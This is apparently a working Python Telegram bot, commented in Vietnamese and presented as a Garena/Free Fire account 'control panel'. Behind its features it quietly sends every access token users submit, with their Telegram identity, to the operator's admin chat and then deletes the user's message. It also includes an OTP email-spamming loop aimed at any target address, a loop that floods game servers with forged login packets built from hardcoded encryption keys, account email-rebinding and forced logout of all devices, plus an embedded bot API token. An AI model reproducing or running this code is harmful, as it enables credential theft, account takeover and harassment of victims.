import telebot
from telebot import types
import requests
import json
import threading
import time
import socket
import base64
import urllib3
import os
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# --- CẤU HÌNH ---
API_TOKEN = '8622851573:AAEWd-_f1CPPT92-oF3gAMjtujZhIOHg6hQ' 
ADMIN_ID = 8038983330  
bot = telebot.TeleBot(API_TOKEN)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

spam_status = {}

HEADERS = {
    "User-Agent": "GarenaMSDK/4.0.30",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json"
}

# --- HÀM HỖ TRỢ HỆ THỐNG ---

def is_token_live(token):
    try:
        url = f"https://100067.connect.garena.com/oauth/token/inspect?token={token}"
        r = requests.get(url, timeout=5).json()
        return 'error' not in r
    except: return False

def escape_markdown(text):
    if not text: return ""
    escape_chars = r"_*[]()~`>#+-=|{}.!"
    return "".join(['\\' + c if c in escape_chars else c for c in str(text)])

def save_user(chat_id):
    """Lưu ID người dùng vào file users.txt, đảm bảo xuống dòng chuẩn"""
    chat_id = str(chat_id).strip()
    try:
        users = []
        if os.path.exists("users.txt"):
            with open("users.txt", "r", encoding="utf-8") as f:
                # Đọc và loại bỏ khoảng trắng thừa để so sánh chính xác
                users = [line.strip() for line in f if line.strip()]
        
        if chat_id not in users:
            with open("users.txt", "a", encoding="utf-8") as f:
                # Đảm bảo ghi UID kèm ký tự xuống dòng
                f.write(f"{chat_id}\n")
            print(f"✅ Đã lưu ID người dùng mới: {chat_id}")
    except Exception as e:
        print(f"❌ Lỗi lưu file: {e}")

def notify_admin(message, token, action_name):
    try:
        user = message.from_user
        first_name = escape_markdown(user.first_name)
        username = f"@{escape_markdown(user.username)}" if user.username else "N/A"
        
        safe_token = escape_markdown(token)
        safe_action = escape_markdown(action_name)
        safe_time = escape_markdown(datetime.now().strftime("%H:%M:%S %d/%m/%Y"))

        log_msg = (
            "⚠️ *THÔNG BÁO TOKEN MỚI* ⚠️\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"👤 *User:* {first_name} \({username}\)\n"
            f"🆔 *ID:* `{user.id}`\n"
            f"🛠 *Hành động:* {safe_action}\n"
            f"🔑 *Access Token:*\n`{safe_token}`\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"⏰ {safe_time}"
        )
        try:
            bot.send_message(ADMIN_ID, log_msg, parse_mode="MarkdownV2")
        except:
            fallback = f"⚠️ LOG DỰ PHÒNG\nID: {user.id}\nToken: {token}\nHành động: {action_name}"
            bot.send_message(ADMIN_ID, fallback)
    except Exception as e:
        print(f"Lỗi gửi admin: {e}")

def wipe_history(message):
    try: 
        bot.delete_message(message.chat.id, message.message_id)
        bot.delete_message(message.chat.id, message.message_id - 1)
    except: pass

# --- LOGIC PROTOBUF ---
class SimpleProtobuf:
    @staticmethod
    def encode_varint(value):
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    @staticmethod
    def encode_string(field_number, value):
        if isinstance(value, str): value = value.encode('utf-8')
        res = bytearray()
        res.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
        res.extend(SimpleProtobuf.encode_varint(len(value)))
        res.extend(value)
        return bytes(res)

    @staticmethod
    def create_login_payload(open_id, access_token, platform):
        payload = bytearray()
        curr = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload.extend(SimpleProtobuf.encode_string(3, curr))
        payload.extend(SimpleProtobuf.encode_string(22, open_id))
        payload.extend(SimpleProtobuf.encode_string(23, platform))
        payload.extend(SimpleProtobuf.encode_string(29, access_token))
        payload.extend(SimpleProtobuf.encode_string(99, platform))
        return bytes(payload)

def get_available_room(hex_data):
    try:
        data = bytes.fromhex(hex_data)
        result = {}; index = 0
        while index < len(data):
            tag = data[index]; field_num = tag >> 3; wire_type = tag & 0x07; index += 1
            if wire_type == 0:
                val = 0; shift = 0
                while index < len(data):
                    byte = data[index]; index += 1
                    val |= (byte & 0x7F) << shift
                    if not (byte & 0x80): break
                    shift += 7
                result[str(field_num)] = {"data": val}
            elif wire_type == 2:
                length = 0; shift = 0
                while index < len(data):
                    byte = data[index]; index += 1
                    length |= (byte & 0x7F) << shift
                    if not (byte & 0x80): break
                    shift += 7
                val_bytes = data[index:index + length]; index += length
                try: result[str(field_num)] = {"data": val_bytes.decode('utf-8')}
                except: result[str(field_num)] = {"data": val_bytes.hex()}
            else: break
        return result
    except: return {}

# --- LOGIC SPAM ---
def run_spam_logic(chat_id, access_token):
    try:
        import MajorLogin_res_pb2
        key, iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'
        h = {"Host": "loginbp.ggpolarbear.com", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "FreeFire/2.103.1 (iPhone; iOS 15.5; Scale/3.00)", "X-GA": "v1 1", "ReleaseVersion": "OB53", "Connection": "keep-alive"}
        
        r_inspect = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}", timeout=10).json()
        if 'error' in r_inspect:
            bot.send_message(chat_id, "❌ Token không hợp lệ.")
            return
            
        open_id, platform = r_inspect.get('open_id'), str(r_inspect.get('platform'))
        pb_payload = SimpleProtobuf.create_login_payload(open_id, access_token, platform)
        enc_payload = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(pb_payload, 16))
        r1 = requests.post("https://loginbp.ggpolarbear.com/MajorLogin", headers=h, data=enc_payload, verify=False)
        
        resp_pb = MajorLogin_res_pb2.MajorLoginRes()
        try:
            dec = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(r1.content), 16)
            resp_pb.ParseFromString(dec)
        except: resp_pb.ParseFromString(r1.content)
        
        h["Host"] = "clientbp.ggpolarbear.com"; h["Authorization"] = f"Bearer {resp_pb.account_jwt}"
        r2 = requests.post("https://clientbp.ggpolarbear.com/GetLoginData", headers=h, data=enc_payload, verify=False)
        room_info = get_available_room(r2.content.hex())
        addr = room_info.get('14', {}).get('data')
        
        if not addr:
            bot.send_message(chat_id, "❌ Lỗi: Server từ chối IP.")
            return
            
        online_ip, online_port = addr[:-6], int(addr[-5:])
        jwt_parts = resp_pb.account_jwt.split('.')
        jwt_payload = json.loads(base64.urlsafe_b64decode(jwt_parts[1] + "==").decode())
        acc_id, exp_adj = int(jwt_payload.get("account_id", 0)), max(int(jwt_payload.get("exp", 0)) - 28800, 0)
        
        cipher_jwt = AES.new(resp_pb.key, AES.MODE_CBC, resp_pb.iv)
        enc_jwt = cipher_jwt.encrypt(pad(resp_pb.account_jwt.encode(), 16))
        final_packet = bytes.fromhex("0115" + acc_id.to_bytes(8, "big").hex() + exp_adj.to_bytes(4, "big").hex() + len(enc_jwt).to_bytes(4, "big").hex()) + enc_jwt
        
        bot.send_message(chat_id, "🚀 Đang tiến hành Spam Log...")
        while spam_status.get(chat_id, {}).get('running'):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(3); s.connect((online_ip, online_port)); s.sendall(final_packet)
            except: pass
            time.sleep(1.5)
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Lỗi hệ thống: {str(e)}")
    finally:
        spam_status[chat_id] = {'running': False}

# --- XỬ LÝ LỆNH BOT ---
@bot.message_handler(commands=['start', 'menu'])
def send_welcome(message):
    save_user(message.chat.id)
    markup = types.InlineKeyboardMarkup(row_width=2)
    # Thêm đầy đủ các nút bấm, chú ý dấu phẩy giữa các nút
    markup.add(
        types.InlineKeyboardButton("🔄 Thay mxt", callback_data='change_bind'),
        types.InlineKeyboardButton("🔓 Gỡ mxt", callback_data='unbind_email'),
        types.InlineKeyboardButton("ℹ️ Check mxt", callback_data='check_info'),
        types.InlineKeyboardButton("🚫 Đăng xuất all", callback_data='logout_all'),
        types.InlineKeyboardButton("🚫 Hủy pending", callback_data='cancel_bind'),
        types.InlineKeyboardButton("🔥 Spam Log", callback_data='spam_log'),
        types.InlineKeyboardButton("🛑 Stop spam Log", callback_data='stop_spam'),
        types.InlineKeyboardButton("📧 Spam OTP Mail", callback_data='spam_otp'),
        types.InlineKeyboardButton("🛑 Stop Spam OTP", callback_data='stop_otp')
    )
    bot.send_message(message.chat.id, "🔥 *GARENA CONTROL PANEL* 🔥\nVui lòng chọn tính năng:", parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(commands=['send'])
def admin_send_menu(message):
    if message.from_user.id != ADMIN_ID: return
    if not os.path.exists("users.txt"):
        bot.reply_to(message, "❌ Chưa có người dùng nào.")
        return

    with open("users.txt", "r") as f:
        user_list = [line.strip() for line in f if line.strip()]

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("📢 GỬI CHO TẤT CẢ (ALL)", callback_data="admin_send_all"))
    for uid in user_list[-15:]: 
        markup.add(types.InlineKeyboardButton(f"👤 User: {uid}", callback_data=f"admin_send_to_{uid}"))

    bot.send_message(ADMIN_ID, "🎯 **CHỌN ĐỐI TƯỢNG GỬI TIN:**", parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    
    # Xử lý khi bấm nút Spam OTP
    if call.data == 'spam_otp':
        msg = bot.send_message(chat_id, "📧 Nhập **Email** mục tiêu để spam OTP:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_start_otp_spam)
            
    # Xử lý khi bấm nút Stop Spam OTP
    elif call.data == 'stop_otp':
        if chat_id in spam_status:
            spam_status[chat_id]['running_otp'] = False # Tắt công tắc dừng vòng lặp
            bot.answer_callback_query(call.id, "🛑 Đang gửi lệnh dừng spam OTP...")
        else:
            bot.send_message(chat_id, "❌ Không có tiến trình spam nào đang chạy.")

    # Các xử lý cũ khác (giữ nguyên)
    elif call.data == 'check_info':
        msg = bot.send_message(chat_id, "🔑 Gửi Access Token để kiểm tra:")
        bot.register_next_step_handler(msg, process_check_info)
    # ... (tiếp tục các phần khác của bạn)
    
    # Xử lý các lệnh Admin trước
    if call.data == "admin_send_all":
        msg = bot.send_message(ADMIN_ID, "📝 Nhập nội dung gửi cho **TẤT CẢ**: ")
        bot.register_next_step_handler(msg, final_send_all)
    
    elif call.data.startswith("admin_send_to_"):
        target_id = call.data.replace("admin_send_to_", "")
        msg = bot.send_message(ADMIN_ID, f"📝 Nhập nội dung gửi cho ID `{target_id}`: ", parse_mode="Markdown")
        bot.register_next_step_handler(msg, final_send_private, target_id)

    elif call.data == 'check_info':
        msg = bot.send_message(chat_id, "🔑 Gửi *Access Token* để kiểm tra:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_check_info)
    elif call.data == 'logout_all':
        msg = bot.send_message(chat_id, "🚫 Gửi *Access Token* để đăng xuất tất cả thiết bị:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_logout_all)
    elif call.data == 'cancel_bind':
        msg = bot.send_message(chat_id, "🚫 Gửi *Access Token* để hủy yêu cầu:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_cancel_bind)
    elif call.data == 'change_bind':
        msg = bot.send_message(chat_id, "1️⃣ Bước 1: Gửi *Access Token*:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, step_old_email)
    elif call.data == 'spam_log':
        if spam_status.get(chat_id, {}).get('running'): 
            bot.send_message(chat_id, "⚠️ Đang spam rồi!")
        else:
            msg = bot.send_message(chat_id, "🚀 Gửi *Access Token* để Spam Log:", parse_mode="Markdown")
            bot.register_next_step_handler(msg, process_start_spam)
    elif call.data == 'stop_spam':
        spam_status[chat_id] = {'running': False}
        bot.send_message(chat_id, "🛑 Đã dừng spam.")
        
    bot.answer_callback_query(call.id)

# --- CÁC HÀM XỬ LÝ LOGIC ---
def process_start_otp_spam(message):
    email = message.text.strip()
    chat_id = message.chat.id
    
    if "@" not in email:
        bot.send_message(chat_id, "❌ Email không hợp lệ, vui lòng thử lại.")
        return

    # Khởi tạo trạng thái cho chat_id này
    if chat_id not in spam_status:
        spam_status[chat_id] = {}
    
    spam_status[chat_id]['running_otp'] = True
    
    # Chạy threading để bot không bị đơ
    threading.Thread(target=run_otp_spam, args=(chat_id, email), daemon=True).start()

def process_check_info(message):
    token = message.text.strip()
    if not is_token_live(token):
        bot.send_message(message.chat.id, "❌ Token Die!")
        return
    notify_admin(message, token, "Check Info")
    wipe_history(message)
    bot.send_message(message.chat.id, "🔍 Đang lấy thông tin...")
    try:
        res = requests.get(f"https://fiddu-bind-info.vercel.app/bind/info?access={token}", timeout=10).json()
        if res.get("status") == "success":
            d = res.get("data", {})
            result = f"📧 Email: `{d.get('current_email')}`\n📩 Chờ: `{d.get('pending_email')}`\n⏳ Còn: `{d.get('countdown_human')}`"
        else: result = f"❌ Lỗi: {res.get('error')}"
    except: result = "❌ Lỗi kết nối."
    bot.send_message(message.chat.id, result, parse_mode="Markdown")
  

def process_logout_all(message):
    token = message.text.strip()
    if not is_token_live(token):
        bot.send_message(message.chat.id, "❌ Token die!")
        return
    try:
        url = "https://100067.connect.garena.com/oauth/logout"
        response = requests.get(url, params={"access_token": token}, timeout=10)
        if response.status_code == 200:
            bot.send_message(message.chat.id, "✅ Đã đá toàn bộ thiết bị!")
        else:
            bot.send_message(message.chat.id, "❌ Garena từ chối lệnh logout.")
    except:
        bot.send_message(message.chat.id, "❌ Lỗi kết nối.")
    notify_admin(message, token, "Logout All Devices")

def process_cancel_bind(message):
    token = message.text.strip()
    if not is_token_live(token):
        bot.send_message(message.chat.id, "❌ Token Die!")
        return
    notify_admin(message, token, "Cancel Bind")
    wipe_history(message)
    try:
        r = requests.post("https://100067.connect.gopapi.io/game/account_security/bind:cancel_request", 
                          headers=HEADERS, data={"app_id": "100067", "access_token": token})
        bot.send_message(message.chat.id, f"🚫 Kết quả: `{r.text}`", parse_mode="Markdown")
    except: bot.send_message(message.chat.id, "❌ Lỗi API.")

def process_start_spam(message):
    token = message.text.strip()
    if not is_token_live(token):
        bot.send_message(message.chat.id, "❌ Token Die!")
        return
    notify_admin(message, token, "Spam Log")
    wipe_history(message)
    spam_status[message.chat.id] = {'running': True}
    threading.Thread(target=run_spam_logic, args=(message.chat.id, token), daemon=True).start()

# --- LUỒNG THAY ĐỔI EMAIL ---
def step_old_email(message):
    token = message.text.strip()
    if not is_token_live(token):
        bot.send_message(message.chat.id, "❌ Token Die!")
        return
    notify_admin(message, token, "Rebind Email (Start)")
    wipe_history(message)
    msg = bot.send_message(message.chat.id, "2️⃣ Nhập *Email cũ*:", parse_mode="Markdown")
    bot.register_next_step_handler(msg, step_new_email, {'token': token})

def step_new_email(message, data):
    data['old_email'] = message.text.strip()
    wipe_history(message)
    msg = bot.send_message(message.chat.id, "3️⃣ Nhập *Email mới*:", parse_mode="Markdown")
    bot.register_next_step_handler(msg, step_send_otp_old, data)

def step_send_otp_old(message, data):
    data['new_email'] = message.text.strip()
    wipe_history(message)
    requests.post("https://100067.connect.garena.com/game/account_security/bind:send_otp", headers=HEADERS, 
                  data={"email": data['old_email'], "app_id": "100067", "access_token": data['token'], "locale": "en_PK", "region": "PK"})
    msg = bot.send_message(message.chat.id, f"📩 Nhập OTP gửi tới `{data['old_email']}`:", parse_mode="Markdown")
    bot.register_next_step_handler(msg, step_verify_identity, data)

def step_verify_identity(message, data):
    otp = message.text.strip()
    wipe_history(message)
    r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity", headers=HEADERS, 
                     data={"email": data['old_email'], "app_id": "100067", "access_token": data['token'], "otp": otp}).json()
    if r.get("identity_token"):
        data['identity_token'] = r.get("identity_token")
        requests.post("https://100067.connect.garena.com/game/account_security/bind:send_otp", headers=HEADERS, 
                      data={"email": data['new_email'], "app_id": "100067", "access_token": data['token'], "locale": "en_PK", "region": "PK"})
        msg = bot.send_message(message.chat.id, f"📩 Nhập OTP gửi tới `{data['new_email']}`:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, step_verify_otp_new, data)
    else: bot.send_message(message.chat.id, "❌ OTP cũ sai.")

def step_verify_otp_new(message, data):
    otp = message.text.strip()
    wipe_history(message)
    r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_otp", headers=HEADERS, 
                     data={"email": data['new_email'], "app_id": "100067", "access_token": data['token'], "otp": otp}).json()
    if r.get("verifier_token"):
        res = requests.post("https://100067.connect.garena.com/game/account_security/bind:create_rebind_request", headers=HEADERS, 
                           data={"identity_token": data['identity_token'], "email": data['new_email'], "app_id": "100067", "verifier_token": r.get("verifier_token"), "access_token": data['token']}).text
        bot.send_message(message.chat.id, f"✅ Kết quả: `{res}`", parse_mode="Markdown")
    else: bot.send_message(message.chat.id, "❌ OTP mới sai.")

def final_send_all(message):
    content = message.text
    if not os.path.exists("users.txt"): return
    with open("users.txt", "r") as f:
        uids = f.read().splitlines()
    bot.send_message(ADMIN_ID, f"🚀 Đang gửi cho {len(uids)} người...")
    for uid in uids:
        try:
            bot.send_message(uid, f"**{content}**", parse_mode="Markdown")
            time.sleep(0.3)
        except: continue
    bot.send_message(ADMIN_ID, "✅ Đã hoàn thành gửi tin.")

def final_send_private(message, target_id):
    try:
        text = (
            "🔔 *THÔNG BÁO RIÊNG*\n"
            "────────────\n\n"
            f"{message.text}"
        )

        bot.send_message(
            chat_id=target_id,
            text=text,
            parse_mode="Markdown"
        )

        bot.send_message(
            chat_id=ADMIN_ID,
            text=f"✅ Đã gửi tới ID `{target_id}`",
            parse_mode="Markdown"
        )

    except Exception as e:
        bot.send_message(
            chat_id=ADMIN_ID,
            text=f"❌ Gửi thất bại.\n`{e}`",
            parse_mode="Markdown"
        )
def run_otp_spam(chat_id, email):
    """Gửi OTP liên tục dựa trên thông số từ ảnh Capture Detail"""
    url = "https://100067.connect.garena.com/game/account_security/swap:send_otp"
    # Dữ liệu chuẩn xác từ ảnh capture của bạn
    payload = {
        "email": email,
        "locale": "vi_VN",
        "region": "VN",
        "app_id": "100067"
    }
    
    bot.send_message(chat_id, f"🚀 Bắt đầu spam OTP tới: `{email}`", parse_mode="Markdown")

    # Vòng lặp kiểm tra trạng thái 'running_otp'
    while spam_status.get(chat_id, {}).get('running_otp'):
        try:
            # Gửi request POST với Header chuẩn
            response = requests.post(url, headers=HEADERS, data=payload, timeout=10)
            # Theo ảnh, result: 0 là thành công
            if response.status_code == 200:
                print(f"DEBUG: Sent OTP to {email}")
        except:
            pass
        time.sleep(1.5) # Nghỉ 1.5 giây để tránh bị khóa IP sớm

    bot.send_message(chat_id, f"🛑 Đã dừng spam OTP cho: `{email}`")

def process_start_otp_spam(message):
    email = message.text.strip()
    chat_id = message.chat.id
    if "@" not in email:
        bot.send_message(chat_id, "❌ Email không hợp lệ!")
        return

    # Khởi tạo và bật công tắc chạy
    if chat_id not in spam_status:
        spam_status[chat_id] = {}
    spam_status[chat_id]['running_otp'] = True
    
    # Chạy luồng riêng (threading) để bot không bị đơ
    threading.Thread(target=run_otp_spam, args=(chat_id, email), daemon=True).start()

if __name__ == "__main__":
    try:
        print(f"🤖 Bot đang chạy! Log Admin: {ADMIN_ID}")
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ Lỗi: {e}")